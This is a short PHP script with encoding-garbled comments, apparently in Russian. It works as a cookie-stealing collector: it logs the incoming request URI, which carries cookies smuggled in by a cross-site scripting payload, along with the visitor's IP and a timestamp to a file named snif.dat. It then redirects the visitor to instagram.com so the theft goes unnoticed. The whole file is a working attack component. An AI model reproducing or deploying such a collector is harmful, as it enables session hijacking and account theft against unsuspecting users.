<?php



//�������� ������ � ������



$cookie = $_SERVER['REQUEST_URI'];



//ip �����



$ip = $_SERVER['REMOTE_ADDR'];



//������ ����



$file = fopen("snif.dat","a+");



//��������� ������� �����



$time = date("H:i:M:d");



//��������� � ��������� ���������� ���� + ����� + ip



$add_text = "$ip $time $cookie";



//���������� ������ � ����



fputs($file,$add_text.",\r\n");



//��������� ����



fclose($file);



//��� �� �� ������� ��������� ������������ ������� � �����



header('Location:https://www.instagram.com');



?>